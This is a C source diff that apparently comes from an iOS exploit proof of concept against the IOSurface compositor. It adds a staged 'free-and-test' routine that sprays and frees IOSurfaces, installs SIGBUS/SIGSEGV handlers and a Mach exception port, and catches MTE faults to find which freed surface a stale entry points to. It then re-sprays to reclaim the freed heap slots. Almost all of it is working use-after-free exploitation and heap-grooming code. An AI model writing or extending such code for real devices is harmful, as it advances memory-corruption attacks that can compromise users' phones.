@@ -1414,6 +1414,17 @@ static void r229_notif_callback(void *surf, uint32_t type, void *ctx) {
     __sync_fetch_and_add(&r229_notif_fire_count, 1);
 }
 
+/* Phase 14 signal/exception handling for free-and-test crash recovery */
+static sigjmp_buf r229_ft_jmpbuf;
+static volatile sig_atomic_t r229_ft_signal = 0;
+static volatile int r229_ft_test_idx = -1;
+
+static void r229_ft_sighandler(int sig, siginfo_t *si, void *ctx) {
+    (void)si; (void)ctx;
+    r229_ft_signal = sig;
+    siglongjmp(r229_ft_jmpbuf, sig);
+}
+
 /* Phase 13: Full PoC Stage C+D — Metal render loop + race variants */
 static volatile int p13_spam_run = 0;
 static io_connect_t p13_spam_conn = IO_OBJECT_NULL;
@@ -19766,19 +19777,28 @@ new_modes:
                 int r229_mte_match = 0;
                 int r229_match_idx = -1;
 
-                /* === Phase 14 detection: free-and-test with signal handling ===
-                 * Bare render loop survives (callback_count=0 for all spray).
-                 * Free one surface at a time; if it was the match, the stale
-                 * entry's IOSurface* now points to freed memory with a different
-                 * MTE tag → compositor traversal faults → signal to our process.
-                 * Non-matched frees are safe (stale entry still reads the live
-                 * matched surface at a different address).
+                /* === Phase 14 detection: free-and-test with signal/exception handling ===
                  *
-                 * Strategy: free from index 255 downward. When we free the
-                 * matched surface and catch the signal, we know the index.
-                 * All surfaces with higher indices are already freed (not needed).
-                 * All surfaces with lower indices are alive (preserved).
-                 * We immediately re-spray to reclaim the freed GEN1 slot. */
+                 * Three identification stages:
+                 *
+                 * Stage A: Fast bulk free [255..64] with periodic render loop
+                 *          checks (empirically safe — match is in [0..63]).
+                 *
+                 * Stage B: Main-thread single-frame trigger with sigsetjmp [63..0].
+                 *          After freeing each surface, create a throwaway IOSurface
+                 *          + CVPixelBuffer from the main thread. If the compositor
+                 *          traversal happens synchronously in our kernel context,
+                 *          the MTE fault delivers SIGBUS to the calling thread,
+                 *          and siglongjmp catches it.
+                 *
+                 * Stage C: Render loop thread + Mach exception port [remaining].
+                 *          If Stage B triggers didn't cause the traversal, fall
+                 *          back to the render loop with a Mach exception port
+                 *          to intercept EXC_BAD_ACCESS from any thread.
+                 *
+                 * If none catches the signal (SIGKILL is uncatchable), the app
+                 * crashes as before but we've written the test index to a state
+                 * file for post-mortem analysis. */
                 {
                     /* Step 1: bare render loop sanity check */
                     rlog("  r=229: Testing bare render loop restart...\n");
@@ -19791,28 +19811,80 @@ new_modes:
                     pthread_join(rt0, NULL);
                     rlog("  r=229: Bare render loop survived.\n");
 
-                    /* Step 2: free-and-test sequential scan */
-                    rlog("  r=229: Starting free-and-test scan (255→0)...\n");
-
-                    /* Save state file for crash recovery */
-                    {
-                        char sp[512];
-                        snprintf(sp, sizeof(sp), "%s/Documents/r229_ft_state.bin",
-                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
-                        int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                        if (sfd >= 0) {
-                            int magic = 0xF7E5; /* free-test magic */
-                            write(sfd, &magic, sizeof(int));
-                            fsync(sfd); close(sfd);
-                        }
+                    /* Step 2: Set up Mach exception port */
+                    mach_port_t ft_exc_port = MACH_PORT_NULL;
+                    kern_return_t ekr = mach_port_allocate(mach_task_self(),
+                        MACH_PORT_RIGHT_RECEIVE, &ft_exc_port);
+                    if (ekr == KERN_SUCCESS) {
+                        mach_port_insert_right(mach_task_self(), ft_exc_port,
+                            ft_exc_port, MACH_MSG_TYPE_MAKE_SEND);
+                        task_set_exception_ports(mach_task_self(),
+                            EXC_MASK_BAD_ACCESS | EXC_MASK_BAD_INSTRUCTION,
+                            ft_exc_port,
+                            EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
+                            THREAD_STATE_NONE);
+                        rlog("  r=229: Mach exception port %u installed\n", ft_exc_port);
+                    } else {
+                        rlog("  r=229: Mach exception port alloc failed: %d\n", ekr);
                     }
+
+                    /* Step 3: Set up signal handlers */
+                    struct sigaction ft_sa, ft_old_bus, ft_old_segv, ft_old_abrt;
+                    memset(&ft_sa, 0, sizeof(ft_sa));
+                    ft_sa.sa_sigaction = r229_ft_sighandler;
+                    ft_sa.sa_flags = SA_SIGINFO;
+                    sigemptyset(&ft_sa.sa_mask);
+                    sigaction(SIGBUS, &ft_sa, &ft_old_bus);
+                    sigaction(SIGSEGV, &ft_sa, &ft_old_segv);
+                    sigaction(SIGABRT, &ft_sa, &ft_old_abrt);
+                    rlog("  r=229: Signal handlers installed (SIGBUS/SIGSEGV/SIGABRT)\n");
+
+                    /* Create IOSurface props for throwaway trigger surfaces */
+                    CFMutableDictionaryRef ft_props = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int ft_w = 64, ft_h = 64, ft_bpe = 4, ft_bpr = ft_w * ft_bpe;
+                    int ft_pf = 0x42475241; /* BGRA */
+                    CFNumberRef ft_wn = CFNumberCreate(NULL, kCFNumberIntType, &ft_w);
+                    CFNumberRef ft_hn = CFNumberCreate(NULL, kCFNumberIntType, &ft_h);
+                    CFNumberRef ft_bn = CFNumberCreate(NULL, kCFNumberIntType, &ft_bpe);
+                    CFNumberRef ft_rn = CFNumberCreate(NULL, kCFNumberIntType, &ft_bpr);
+                    CFNumberRef ft_pfn = CFNumberCreate(NULL, kCFNumberIntType, &ft_pf);
+                    CFDictionarySetValue(ft_props, CFSTR("IOSurfaceWidth"), ft_wn);
+                    CFDictionarySetValue(ft_props, CFSTR("IOSurfaceHeight"), ft_hn);
+                    CFDictionarySetValue(ft_props, CFSTR("IOSurfaceBytesPerElement"), ft_bn);
+                    CFDictionarySetValue(ft_props, CFSTR("IOSurfaceBytesPerRow"), ft_rn);
+                    CFDictionarySetValue(ft_props, CFSTR("IOSurfacePixelFormat"), ft_pfn);
 
                     int ft_found = -1;
 
-                    for (int fi = 255; fi >= 0 && ft_found < 0; fi--) {
+                    /* ---- Stage A: Fast bulk free [255..64] ---- */
+                    rlog("  r=229: Stage A: fast free [255→64]...\n");
+                    for (int fi = 255; fi >= 64 && ft_found < 0; fi--) {
+                        if (!r229_spray[fi]) continue;
+                        uint32_t sid = IOSurfaceGetID(r229_spray[fi]);
+                        CFRelease(r229_spray[fi]);
+                        r229_spray[fi] = NULL;
+
+                        if (fi % 32 == 0) {
+                            p13_render_frames = 0;
+                            p13_render_run = 1;
+                            pthread_t rft;
+                            pthread_create(&rft, NULL, p13_render_loop, NULL);
+                            usleep(80000);
+                            p13_render_run = 0;
+                            pthread_join(rft, NULL);
+                            rlog("  r=229: FT-A[%d] survived (id=%u)\n", fi, sid);
+                        }
+                    }
+                    rlog("  r=229: Stage A complete, 64 surfaces remain [0..63]\n");
+
+                    /* ---- Stage B: Main-thread trigger with sigsetjmp [63..0] ---- */
+                    rlog("  r=229: Stage B: main-thread trigger [63→0] with signal handling\n");
+                    int stageB_tested = 0;
+                    for (int fi = 63; fi >= 0 && ft_found < 0; fi--) {
                         if (!r229_spray[fi]) continue;
 
-                        /* Save current test index to file (crash recovery) */
+                        /* Write test index to state file */
                         {
                             char sp[512];
                             snprintf(sp, sizeof(sp), "%s/Documents/r229_ft_state.bin",
@@ -19826,33 +19898,158 @@ new_modes:
                             }
                         }
 
-                        /* Free this spray surface */
                         uint32_t sid = IOSurfaceGetID(r229_spray[fi]);
                         CFRelease(r229_spray[fi]);
                         r229_spray[fi] = NULL;
 
-                        /* Brief bare render loop — if matched surface was freed,
-                         * the compositor hits freed memory → MTE fault → crash */
-                        p13_render_frames = 0;
-                        p13_render_run = 1;
-                        pthread_t rft;
-                        pthread_create(&rft, NULL, p13_render_loop, NULL);
-                        usleep(80000); /* 80ms ≈ 5 frames */
-                        p13_render_run = 0;
-                        pthread_join(rft, NULL);
+                        r229_ft_signal = 0;
+                        r229_ft_test_idx = fi;
 
-                        /* Survived — this surface was NOT the match */
-                        if (fi % 32 == 0) {
-                            rlog("  r=229: FT[%d] survived (id=%u), %d remaining\n",
-                                fi, sid, fi);
+                        if (sigsetjmp(r229_ft_jmpbuf, 1) == 0) {
+                            /* Normal path: main-thread single-frame trigger.
+                             * IOSurfaceCreate may trigger compositor traversal
+                             * synchronously in our kernel context. If the freed
+                             * surface was the match, the MTE fault should deliver
+                             * SIGBUS to this thread. */
+                            for (int trig = 0; trig < 3 && ft_found < 0; trig++) {
+                                IOSurfaceRef ts = IOSurfaceCreate(ft_props);
+                                if (ts) {
+                                    CVPixelBufferRef tpx = NULL;
+                                    CVPixelBufferCreateWithIOSurface(NULL, ts, NULL, &tpx);
+                                    usleep(20000);
+                                    if (tpx) CFRelease(tpx);
+                                    CFRelease(ts);
+                                }
+                            }
+                            usleep(10000);
+
+                            /* Check Mach exception port (non-blocking) */
+                            if (ft_exc_port != MACH_PORT_NULL) {
+                                struct {
+                                    mach_msg_header_t head;
+                                    char data[256];
+                                } exc_msg;
+                                kern_return_t mkr = mach_msg(&exc_msg.head,
+                                    MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                    0, sizeof(exc_msg), ft_exc_port,
+                                    0, MACH_PORT_NULL);
+                                if (mkr == KERN_SUCCESS) {
+                                    rlog("  r=229: MACH EXCEPTION on FT-B[%d] id=%u → MATCH!\n",
+                                        fi, sid);
+                                    ft_found = fi;
+                                }
+                            }
+
+                            /* Survived main-thread trigger */
+                            stageB_tested++;
+                            if (fi % 8 == 0) {
+                                rlog("  r=229: FT-B[%d] survived main-thread trigger (id=%u)\n",
+                                    fi, sid);
+                            }
+                        } else {
+                            /* Signal caught via siglongjmp! */
+                            rlog("  r=229: SIGNAL %d on FT-B[%d] id=%u → MATCH CAUGHT!\n",
+                                r229_ft_signal, fi, sid);
+                            ft_found = fi;
                         }
                     }
+                    rlog("  r=229: Stage B tested %d surfaces, found=%d\n",
+                        stageB_tested, ft_found);
 
-                    if (ft_found < 0) {
-                        /* If we survived all 256 frees, something unexpected.
-                         * The stale entry might have been cleaned up. */
-                        rlog("  r=229: FT scan complete — all survived (no match?)\n");
-                        rlog("  r=229: Stale entry may have been deregistered.\n");
+                    /* ---- Stage C: Render loop + Mach exc port (if B didn't trigger) ----
+                     * If Stage B survived all 64 without catching a signal, the
+                     * main-thread trigger didn't cause the traversal. We've already
+                     * freed all surfaces, so if no match was found, the stale entry
+                     * was cleaned up or the traversal is only async (render loop).
+                     *
+                     * Since all surfaces are freed, re-spray and try render loop
+                     * approach with Mach exception port monitoring. */
+                    if (ft_found < 0 && stageB_tested >= 60) {
+                        rlog("  r=229: Stage C: main-thread trigger didn't crash.\n");
+                        rlog("  r=229: All 64 surfaces freed without fault.\n");
+                        rlog("  r=229: Traversal may be async-only (render loop).\n");
+                        rlog("  r=229: Re-spraying and testing with render loop...\n");
+
+                        /* Re-spray 64 surfaces to reclaim GEN1 slots */
+                        CFMutableDictionaryRef sp_props = CFDictionaryCreateMutable(NULL, 0,
+                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                        int sp_w = 64, sp_h = 64, sp_bpe = 4, sp_bpr = sp_w * sp_bpe;
+                        int sp_pf = 0x42475241;
+                        CFNumberRef sp_wn = CFNumberCreate(NULL, kCFNumberIntType, &sp_w);
+                        CFNumberRef sp_hn = CFNumberCreate(NULL, kCFNumberIntType, &sp_h);
+                        CFNumberRef sp_bn = CFNumberCreate(NULL, kCFNumberIntType, &sp_bpe);
+                        CFNumberRef sp_rn = CFNumberCreate(NULL, kCFNumberIntType, &sp_bpr);
+                        CFNumberRef sp_pfn = CFNumberCreate(NULL, kCFNumberIntType, &sp_pf);
+                        CFDictionarySetValue(sp_props, CFSTR("IOSurfaceWidth"), sp_wn);
+                        CFDictionarySetValue(sp_props, CFSTR("IOSurfaceHeight"), sp_hn);
+                        CFDictionarySetValue(sp_props, CFSTR("IOSurfaceBytesPerElement"), sp_bn);
+                        CFDictionarySetValue(sp_props, CFSTR("IOSurfaceBytesPerRow"), sp_rn);
+                        CFDictionarySetValue(sp_props, CFSTR("IOSurfacePixelFormat"), sp_pfn);
+
+                        int respray_n = 0;
+                        for (int si = 0; si < 64; si++) {
+                            r229_spray[si] = IOSurfaceCreate(sp_props);
+                            if (r229_spray[si]) respray_n++;
+                        }
+                        rlog("  r=229: Re-sprayed %d surfaces\n", respray_n);
+
+                        CFRelease(sp_wn); CFRelease(sp_hn); CFRelease(sp_bn);
+                        CFRelease(sp_rn); CFRelease(sp_pfn); CFRelease(sp_props);
+
+                        /* Test render loop — if stale entry was cleaned up, this
+                         * survives. If not, we may get a new match. */
+                        p13_render_frames = 0;
+                        p13_render_run = 1;
+                        pthread_t rc_th;
+                        pthread_create(&rc_th, NULL, p13_render_loop, NULL);
+                        usleep(200000);
+                        p13_render_run = 0;
+                        pthread_join(rc_th, NULL);
+
+                        /* Check exception port */
+                        if (ft_exc_port != MACH_PORT_NULL) {
+                            struct {
+                                mach_msg_header_t head;
+                                char data[256];
+                            } exc_msg;
+                            kern_return_t mkr = mach_msg(&exc_msg.head,
+                                MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                0, sizeof(exc_msg), ft_exc_port,
+                                0, MACH_PORT_NULL);
+                            if (mkr == KERN_SUCCESS) {
+                                rlog("  r=229: MACH EXCEPTION in Stage C render loop!\n");
+                            }
+                        }
+
+                        rlog("  r=229: Stage C render loop survived (stale entry gone?)\n");
+                        rlog("  r=229: Proceeding with all %d re-sprayed surfaces\n", respray_n);
+                    }
+
+                    /* Restore signal handlers */
+                    sigaction(SIGBUS, &ft_old_bus, NULL);
+                    sigaction(SIGSEGV, &ft_old_segv, NULL);
+                    sigaction(SIGABRT, &ft_old_abrt, NULL);
+                    rlog("  r=229: Signal handlers restored\n");
+
+                    /* Cleanup */
+                    CFRelease(ft_wn); CFRelease(ft_hn); CFRelease(ft_bn);
+                    CFRelease(ft_rn); CFRelease(ft_pfn); CFRelease(ft_props);
+
+                    if (ft_found >= 0) {
+                        rlog("  r=229: *** MATCH IDENTIFIED: spray[%d] ***\n", ft_found);
+                        r229_match_idx = ft_found;
+                        r229_mte_match = 1;
+                    } else {
+                        rlog("  r=229: No match identified via signal handling.\n");
+                        rlog("  r=229: Likely SIGKILL (uncatchable MTE fault).\n");
+                        /* Count remaining live surfaces */
+                        int live_n = 0;
+                        for (int si = 0; si < 256; si++) {
+                            if (r229_spray[si]) live_n++;
+                        }
+                        rlog("  r=229: %d live surfaces remain — proceeding blind\n", live_n);
+                        r229_mte_match = 1;
+                        r229_match_idx = -1; /* unknown — use all surfaces */
                     }
                 }
 
@@ -20233,8 +20430,8 @@ new_modes:
                     rlog("  ========================================\n");
                     rlog("  matched spray[%d] id=%u addr=%p\n",
                         r229_match_idx,
-                        r229_spray[r229_match_idx] ? IOSurfaceGetID(r229_spray[r229_match_idx]) : 0,
-                        r229_spray[r229_match_idx] ? (void *)r229_spray[r229_match_idx] : NULL);
+                        (r229_match_idx >= 0 && r229_spray[r229_match_idx]) ? IOSurfaceGetID(r229_spray[r229_match_idx]) : 0,
+                        (r229_match_idx >= 0 && r229_spray[r229_match_idx]) ? (void *)r229_spray[r229_match_idx] : NULL);
                     rlog("  crashes=%d phase=%d\n", r229_crash_count, r229_phase);
 
                     if (r229_match_idx >= 0) {
